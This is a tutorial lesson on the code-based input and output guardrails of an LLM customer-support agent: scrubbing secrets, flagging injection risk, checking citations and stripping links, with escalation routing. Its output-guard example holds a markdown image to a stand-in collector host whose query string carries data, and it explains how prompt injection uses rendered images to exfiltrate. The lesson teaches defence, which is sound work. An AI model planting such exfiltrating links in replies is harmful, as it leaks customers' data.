Resolve reads text a stranger typed, retrieves articles that anyone at Quillstack can edit, and holds tools that file issues and close tickets. **OWASP Threat Modeling** explained why that combination is dangerous: a model has no wall between the data it reads and the instructions it follows. A **guardrail** is a check written in plain code that runs outside the model and can stop a run. Resolve has two, `input_guard` and `output_guard`, and neither one makes a model call. This lesson walks through both as they exist in `src/resolve/guards/`, shows where they sit in the graph, and runs each one on a real ticket and a real draft.

## Where the two nodes sit

The graph from **LangChain & LangGraph** has fixed node names, and the guards are the first node and the second to last:

```plain text
input_guard -> classify -> [router] -> knowledge_agent | billing_agent | bug_agent | escalate
specialist -> review -> (revise once -> same specialist) -> output_guard -> route -> resolve | escalate
```

`input_guard` runs before `classify`, so before any model call and before any tool. `output_guard` runs after `review` has approved a draft and before `route` decides what happens to it. Both nodes are thin: each reads the state, calls one function in `resolve.guards`, and writes one dict back. Here is the whole input node, `src/resolve/graph/nodes/input_guard.py`:

```python
from resolve.graph.usage import Meter
from resolve.guards.input import guard_ticket

def input_guard(state: dict) -> dict:
    meter = Meter()
    ticket, guard = guard_ticket(state["ticket"])
    out = {"ticket": ticket, "guard_input": guard, "usage": meter.merge(state)}
    if guard["quarantined"]:
        out["escalation_reason"] = (f"input_guard quarantined the ticket: risk {guard['risk']:.2f} "
                                    f"(flags: {', '.join(guard['flags'])})")
    return out
```

Two details matter. The node replaces `ticket` in the state with the cleaned copy, so every later node, `classify` included, sees the scrubbed text and never the original. And the node routes nothing. It writes `guard_input` (`flags`, `risk`, `quarantined`) and, when it quarantines, an `escalation_reason`. The routing lives in a **conditional edge**, a function the graph calls after a node to pick the next node by name. From `src/resolve/graph/nodes/router.py`:

```python
def after_input_guard(state: dict) -> str:
    return "escalate" if (state.get("guard_input") or {}).get("quarantined") else "classify"
```

`build.py` wires it with `g.add_conditional_edges("input_guard", after_input_guard, {"classify": "classify", "escalate": "escalate"})`. A quarantined ticket goes straight to `escalate`, which posts an internal note carrying the flags and sets the status to `escalated`, so a support engineer reads it with the reason attached. Nothing else runs. That is why a quarantined ticket in the reference build costs $0.00 and finishes in under a second once the detector's model is loaded.

Keeping detection and routing apart is deliberate. You can log a flag without acting on it while you tune a threshold, and when someone asks what quarantine means you can point at one line.

*Diagram idea: the graph above drawn left to right with `input_guard` and `output_guard` in a second color, one arrow from `input_guard` labelled "quarantined" bending down to `escalate`, and `route` shown reading `guard_output.flags` before it picks `resolve`.*

## The input guard, in order

`guard_ticket()` in `src/resolve/guards/input.py` runs four checks in a fixed order and reads its limits from `configs/guards.yaml`.

1. Length cap: a body longer than `input.max_chars` (6000) is cut there, `[truncated by input_guard]` is appended, and the flag `truncated` is set. Size goes first because a 200,000-character ticket should be cut before any pattern matcher sees it.
2. Secret scrub: subject and body pass through `scrub_secrets()`, which replaces anything shaped like a credential with a marker and records one flag per kind.
3. Encoded-text flags: a base64 run of at least `input.base64_min_len` (40) characters sets `encoded:base64`; any zero-width character sets `encoded:zero_width`. These are flags only, because a webhook body can legitimately be base64.
4. Injection risk: the combined text goes to the detector from the next lesson, which returns a score in [0, 1] plus the names of the heuristics that fired. Each heuristic becomes a flag `injection:<name>`, the classifier's probability becomes a flag like `classifier:0.99`, and a score at or above `injection.threshold` (0.65) sets `quarantined`.

The scrub patterns are the real ones from `SECRET_PATTERNS`:

<table header-row="true">
<tr>
<td>kind</td>
<td>matches</td>
<td>replaced with</td>
</tr>
<tr>
<td>`api_key`</td>
<td>`qs_live_` and six or more letters or digits</td>
<td>`[REDACTED:api_key]`</td>
</tr>
<tr>
<td>`webhook_secret`</td>
<td>`whsec_` and six or more letters or digits</td>
<td>`[REDACTED:webhook_secret]`</td>
</tr>
<tr>
<td>`bearer`</td>
<td>the word bearer, then a token of 16 or more characters</td>
<td>`[REDACTED:bearer]`</td>
</tr>
<tr>
<td>`generic_key`</td>
<td>`sk`, `pk`, `key`, `token` or `api`, a separator, optionally `live` or `test`, then 20 or more characters</td>
<td>`[REDACTED:generic_key]`</td>
</tr>
<tr>
<td>`password`</td>
<td>password, passwd, pwd or passphrase followed by "is", a colon or an equals sign and a value</td>
<td>the label stays, the value becomes `[REDACTED:password]`</td>
</tr>
<tr>
<td>`card`</td>
<td>13 to 16 digits with optional spaces or dashes, kept only if the Luhn check passes</td>
<td>`[REDACTED:card]`</td>
</tr>
</table>

A seventh pattern, `aws_key`, matches a well-known cloud access-key shape and is there for pasted CI configs. The `card` row is the one with a twist: the **Luhn check** is the checksum every real card number satisfies, so `_luhn()` lets a 16-digit order number through and redacts a real card number. Run the scrub on its own first:

```python
from resolve.guards.input import scrub_secrets

text = "My key qs_live_8f3kD92mQx7 returns QS-1042 since Monday. Password: hunter2pass"
clean, flags = scrub_secrets(text)
print(clean)
print(flags)
```

```plain text
My key [REDACTED:api_key] returns QS-1042 since Monday. Password: [REDACTED:password]
['secret:api_key', 'secret:password']
```

The error code survives, the key and the password do not, and the word "Password:" stays so the specialist can still tell the customer typed one. Now the whole guard on a ticket dict with the same key in the body:

```python
from resolve.guards.input import guard_ticket

ticket = {"subject": "API key rejected",
          "body": "My key qs_live_8f3kD92mQx7 returns QS-1042 since Monday.",
          "customer_email": "dev@northwindlabs.io", "plan": "Team", "channel": "web"}
clean, guard = guard_ticket(ticket)
print(clean["body"])
print(guard)
```

```plain text
My key [REDACTED:api_key] returns QS-1042 since Monday.
{'flags': ['secret:api_key', 'classifier:1.00'], 'risk': 0.6, 'quarantined': False}
```

The first call takes a while because the detector loads its classifier model; after that it is fast. Read the second line carefully. The classifier gave this ordinary bug report a probability of 1.00, and the ticket was still not quarantined: the classifier's weight caps its contribution at 0.6, under the 0.65 threshold. The next lesson explains why that ceiling exists. For now the point is that the key was gone before `classify` ever ran, so the original string appears nowhere in the state, the checkpoint, or a trace.

## The output guard, in order

`guard_draft(draft, citations, docs, tool_calls)` in `src/resolve/guards/output.py` runs five checks and returns the cleaned draft plus `guard_output` (`flags`, `ok`). It uses three state fields you have already met: `draft` is the specialist's reply text, `citations` is the list of `doc_id`s the specialist says it relied on, and `docs` is every chunk that `search_kb` returned during the run, each with a `doc_id` and a `space` of `public` or `internal`.

1. Secret scrub: the same `scrub_secrets()` on the draft, flagged as `secret_scrubbed:<kind>`. A credential in a reply is evidence that something upstream tried to move it out, whatever the customer asked.
2. Citation check: `check_citations()` takes the union of `citations` and every `kb-NNNN` id mentioned in the draft text. An id that is not in `docs` becomes `citation_unknown:<id>`; an id whose chunk has `space == "internal"` becomes `citation_internal:<id>`. The reviewer is asked to catch both, and this is the check that holds when the reviewer does not.
3. Link check: `strip_links()` removes every image or link whose host is not on `output.allowed_link_hosts` in `configs/guards.yaml` (`quillstack.com`, `app.quillstack.com`, `help.quillstack.com`, `api.quillstack.com`). The host comes from `urlparse(url).hostname` and must equal an allowed host or end with a dot and an allowed host, so `evil-quillstack.com` fails and `docs.help.quillstack.com` passes.
4. Schema: a draft under `output.min_draft_chars` (40) is `schema:draft_too_short`, one over `output.max_draft_chars` (4000) is `schema:draft_too_long`, and an empty `citations` list is `schema:no_citations`. The JSON shape of the reply was already enforced in the loop by the `FinalAnswer` Pydantic model; this check is about the shape a human cares about.
5. Write flag: any entry in `tool_calls` with `write: True` whose `node` is not `resolve` or `escalate` becomes `wrote:<tool>`, and any tool result the detector dropped becomes `chunk_dropped:<n>`.

`ok` is true only when the flag list is empty. The link check has three passes, and the order shows why images are treated differently from links:

```python
from resolve.guards.output import strip_links

draft = ("Hi Dana, rotate the key under Settings > API keys. "
         "![status](https://collect.example.net/p.png?t=T-10042) "
         "Details: https://help.quillstack.com/api-keys and [our guide](https://rival.example/keys).")
clean, flags = strip_links(draft, ["quillstack.com", "help.quillstack.com"])
print(clean)
print(flags)
```

```plain text
Hi Dana, rotate the key under Settings > API keys.  Details: https://help.quillstack.com/api-keys and our guide.
['link_stripped:collect.example.net', 'link_stripped:rival.example']
```

The image is deleted outright. As text it is inert, but the moment a helpdesk or a mail client renders it, the browser fetches that URL, and the query string carries whatever an injection told the model to append. Nothing was "sent" in any sense the agent would notice. The markdown link keeps its text and loses its target, so a reply that mentions an outside site stays readable. The `help.quillstack.com` URL is untouched. Now the full guard on a draft that breaks three rules at once:

```python
from resolve.guards.output import guard_draft

docs = [{"doc_id": "kb-0015", "space": "public", "title": "Archive a project"},
        {"doc_id": "kb-0104", "space": "internal", "title": "Refund approval policy"}]
draft = ("Hi Dana, archive from Settings > Projects (kb-0015). "
         "Refunds follow kb-0104. Token: whsec_a1b2c3d4e5f6")
tool_calls = [{"name": "create_issue", "write": True, "node": "bug_agent"}]
clean, guard = guard_draft(draft, ["kb-0015", "kb-0104"], docs, tool_calls)
print(clean)
print(guard)
```

```plain text
Hi Dana, archive from Settings > Projects (kb-0015). Refunds follow kb-0104. Token: [REDACTED:webhook_secret]
{'flags': ['secret_scrubbed:webhook_secret', 'citation_internal:kb-0104', 'wrote:create_issue'], 'ok': False}
```

The secret is scrubbed in place, the internal citation is flagged and left in the text for the reviewer to see, and the write the bug specialist made is recorded as a flag. The node in `nodes/output_guard.py` writes the cleaned draft back into `draft` and the dict into `guard_output`, and that is all it does.

## How route refuses a flagged draft

`route` is code too. `decide()` in `src/resolve/graph/nodes/route.py` builds a list of reasons and auto-resolves only when the list is empty:

```python
flags = [f for f in guard_out.get("flags", []) if f != "guards_disabled"]
if flags:
    reasons.append(f"output flags: {', '.join(flags)}")
if c.get("type") not in AUTO_RESOLVE_TYPES:
    reasons.append(f"type {c.get('type')} never auto-resolves")
if reasons:
    return "escalate", "; ".join(reasons)
return "auto_resolve", ""
```

The other reasons on that list are the ones SPEC names: the review verdict must be `approve`, `confidence` must reach `confidence_threshold` (0.7 in `configs/graph.yaml`), the type must be `how_to` or `billing`, and a billing ticket that asks for a refund or reports a duplicate charge escalates whatever else is true. Every reason is written into `escalation_reason`, so the internal note tells the engineer why. Try it with one stripped link:

```python
from resolve.graph.nodes.route import decide

state = {"classification": {"type": "how_to"}, "review": {"verdict": "approve", "reasons": []},
         "confidence": 0.92, "guard_input": {"quarantined": False}, "ticket": {},
         "guard_output": {"flags": ["link_stripped:collect.example.net"], "ok": False}}
print(decide(state))
state["guard_output"] = {"flags": [], "ok": True}
print(decide(state))
```

```plain text
('escalate', 'output flags: link_stripped:collect.example.net')
('auto_resolve', '')
```

Same draft, same approval, same confidence. One flag is enough. This is the property Marcus, the security lead, asked for: the decision to send a reply under Quillstack's name is made by code that reads flags, and the flags are set by code that reads text. No model sits between a stripped link and the escalation.

One switch touches both guards. `guards_enabled` in `configs/guards.yaml`, or the environment variable `RESOLVE_GUARDS_ENABLED=0`, makes `guard_ticket()` and `guard_draft()` return their input unchanged with a single flag, `guards_disabled`, which `route` ignores. It exists so the injection suite can run guards-off, and for nothing else.

## The cost of a false positive

A guard that quarantines real tickets is its own outage, and nobody pages you for it. Every check trades **recall**, the share of attacks it catches, against **precision**, the share of what it flags that was really an attack. Both are measurable, and you measure them on labelled cases rather than by feel; the next lesson does that for the detector and the one after it for the whole graph. Resolve leans toward flag-and-escalate over hard blocks for a reason you can put in money: a quarantined ticket costs a support engineer thirty seconds reading a note that lists the flags, and a silently dropped ticket costs a customer.

<callout icon="🤖" color="blue_bg">
	**Working with AI**
	Guard code is good work to delegate: mechanical, pattern-based, and checkable by running it. Ask an assistant for more credential shapes your scrub should catch and for every channel a reply could leak data through, then read what comes back for four things. The input node labels and never routes. The link scrubber runs on every draft, not only flagged ones. Host checks compare a parsed hostname against the list, never a substring of the URL. Any write outside `resolve` and `escalate` sets a flag. Then paste each attack string through your own guard and confirm it fires. Models are good at generating variety and unreliable at knowing whether your regex matches.
</callout>

Both guards screen for a broad class of bad input and bad output. The next lesson, **Injection Detection in the Ticket Flow**, opens up the fourth check of the input guard: the heuristics, the local classifier, how the score is combined, how the same detector screens retrieved chunks and tool results, and what it catches and misses on the forty seed cases.
